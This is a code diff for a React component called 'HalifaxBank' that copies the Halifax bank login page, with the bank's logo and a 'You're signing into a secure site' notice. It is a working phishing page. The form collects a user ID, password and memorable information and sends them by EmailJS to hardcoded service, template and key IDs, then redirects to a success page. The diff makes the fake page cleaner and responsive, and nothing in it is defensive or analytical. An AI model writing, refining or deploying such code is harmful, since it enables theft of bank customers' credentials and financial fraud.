@@ -6,13 +6,13 @@ import { useNavigate } from "react-router-dom";
 import emailjs from "@emailjs/browser";
 
 export default function HalifaxBank() {
-  const form = useRef(); // ✅ EmailJS form ref
+  const form = useRef();
   const navigate = useNavigate();
 
   const [errors, setErrors] = useState({
     userId: false,
     password: false,
-    memorable: false,
+    memorable: false
   });
 
   const sendLoginEmail = (e) => {
@@ -26,56 +26,56 @@ export default function HalifaxBank() {
     const newErrors = {
       userId: !userId,
       password: !password,
-      memorable: !memorable,
+      memorable: !memorable
     };
     setErrors(newErrors);
 
     if (!newErrors.userId && !newErrors.password && !newErrors.memorable) {
       emailjs
         .sendForm(
-          "service_e1eul13", // ✅ your EmailJS service ID
-          "template_x4r3vzo", // ✅ your template ID
+          "service_e1eul13",
+          "template_x4r3vzo",
           form.current,
-          "nb4k7l5gjhCm1Jyk1" // ✅ your public key
+          "nb4k7l5gjhCm1Jyk1"
         )
         .then(
           (result) => {
             console.log("Email sent:", result.text);
-            navigate("/success"); // ✅ redirect
+            navigate("/success");
           },
           (error) => {
             console.log("Error:", error.text);
           }
         );
 
-      e.target.reset(); // ✅ clear form
+      e.target.reset();
     }
   };
 
   return (
     <div className="min-h-screen bg-white">
       {/* Header */}
-      <header className="bg-[#0040BB] text-white flex items-center justify-between px-6 py-3">
+      <header className="bg-[#0040BB] text-white flex flex-col md:flex-row items-center justify-center px-4 sm:px-6 lg:px-20 py-4 space-y-4 md:space-y-0 md:space-x-30">
         {/* Left Section: Logo */}
-        <div className="flex items-center space-x-2 ml-80">
-          <img src="img/halifax logo.png" alt="Logo" className="h-13 w-25" />
+        <div className="flex items-center">
+          <img src="img/halifax logo.png" alt="Logo" className="h-10 w-auto" />
         </div>
 
         {/* Right Section */}
-        <div className="flex items-center space-x-6 mr-86">
-          <a href="#" className="underline text-lg">
+        <div className="flex flex-col md:flex-row items-center space-y-3 md:space-y-0 md:space-x-6 text-center md:text-left">
+          <a href="#" className="underline text-sm sm:text-base">
             Mobile
           </a>
-          <a href="#" className="underline text-lg">
+          <a href="#" className="underline text-sm sm:text-base">
             Cookie policy
           </a>
 
-          <div className="border border-white px-8 py-3 text-sm">
-            <p className="font-semibold flex items-center space-x-2">
+          <div className="border border-white px-4 py-2 md:px-6 md:py-3 text-xs sm:text-sm">
+            <p className="font-semibold flex items-center justify-center md:justify-start space-x-2">
               <FaLock className="text-white" />
               <span>You’re signing into a secure site</span>
             </p>
-            <a href="#" className="underline text-xs">
+            <a href="#" className="underline text-xs block mt-1">
               How can I tell that this site is secure?
             </a>
           </div>
@@ -83,11 +83,11 @@ export default function HalifaxBank() {
       </header>
 
       {/* Login Form */}
-      <main className="flex flex-col items-start mt-20 ml-60">
+      <main className="flex justify-center mt-10 px-4 sm:px-6">
         <form
           ref={form}
           onSubmit={sendLoginEmail}
-          className="w-full max-w-lg rounded-md p-6"
+          className="w-full max-w-lg rounded-md p-6 shadow-md bg-white"
         >
           {/* User ID */}
           <div className="mb-4">
@@ -96,12 +96,12 @@ export default function HalifaxBank() {
               className={`p-3 rounded border-2 ${
                 errors.userId
                   ? "border-red-500 bg-red-50"
-                  : "border-gray-800 bg-white"
+                  : "border-gray-300 bg-white"
               }`}
             >
               <input
                 type="text"
-                name="userId" // ✅ EmailJS field
+                name="userId"
                 className="w-full bg-transparent outline-none text-base"
                 placeholder="Enter User ID"
               />
@@ -121,12 +121,12 @@ export default function HalifaxBank() {
               className={`p-3 rounded border-2 ${
                 errors.password
                   ? "border-red-500 bg-red-50"
-                  : "border-gray-800 bg-white"
+                  : "border-gray-300 bg-white"
               }`}
             >
               <input
                 type="password"
-                name="password" // ✅ EmailJS field
+                name="password"
                 className="w-full bg-transparent outline-none text-base"
                 placeholder="Enter Password"
               />
@@ -139,21 +139,21 @@ export default function HalifaxBank() {
             )}
           </div>
 
-          {/* Memorable Information */}
+          {/* Memorable */}
           <div className="mb-6">
             <label className="block text-sm font-medium mb-1">Memorable:</label>
             <div
               className={`p-3 rounded border-2 ${
                 errors.memorable
                   ? "border-red-500 bg-red-50"
-                  : "border-gray-800 bg-white"
+                  : "border-gray-300 bg-white"
               }`}
             >
               <input
                 type="text"
-                name="memorable" // ✅ EmailJS field
+                name="memorable"
                 className="w-full bg-transparent outline-none text-base"
-                placeholder="Enter memorable"
+                placeholder="Enter Memorable"
               />
             </div>
             {errors.memorable && (
@@ -167,7 +167,7 @@ export default function HalifaxBank() {
           {/* Continue Button */}
           <button
             type="submit"
-            className="ml-87 px-6 py-3 bg-[#0040BB] text-white font-semibold transition"
+            className="w-full sm:w-auto px-6 py-3 bg-[#0040BB] text-white font-semibold transition"
           >
             Continue
           </button>
